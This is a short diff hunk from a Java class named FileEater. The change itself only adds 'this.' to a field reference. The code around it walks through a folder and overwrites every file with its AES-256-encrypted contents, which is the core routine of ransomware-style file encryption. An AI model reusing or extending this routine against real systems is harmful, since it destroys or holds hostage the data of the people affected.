@@ -28,7 +28,7 @@ public class FileEater {
         File folder = new File(this.path);
         for (File file : folder.listFiles()) {
             if (file.isFile()) {
-                fileIO.writeFile(file, cryptoUnit.encryptAES256(fileIO.readFile(file)));
+                this.fileIO.writeFile(file, cryptoUnit.encryptAES256(fileIO.readFile(file)));
             }
         }
         return true;
